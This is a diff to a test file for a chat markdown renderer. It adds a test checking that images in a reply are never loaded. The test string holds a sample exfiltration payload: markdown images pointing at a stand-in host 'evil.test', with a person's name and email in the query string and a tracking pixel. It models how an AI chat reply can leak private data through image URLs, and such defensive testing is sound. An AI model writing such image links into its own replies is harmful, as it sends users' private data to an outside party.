@@ -21,3 +21,10 @@ it('opens links in a new tab and drops unsafe targets and raw HTML', () => {
   expect(screen.getByText('bad').getAttribute('href') ?? '').not.toContain('javascript')
   expect(document.querySelector('img')).toBeNull()
 })
+
+it('never loads images from the reply, so an image address cannot carry private data out', () => {
+  render(<ChatMarkdown content={'Done ![Summary chart](https://evil.test/p.png?name=Jane+Doe&email=jane@example.com) ![](https://evil.test/pixel.gif)'} />)
+  expect(document.querySelector('img')).toBeNull()
+  expect(screen.getByText('Summary chart')).toBeInTheDocument()
+  expect(document.body.innerHTML).not.toContain('evil.test')
+})
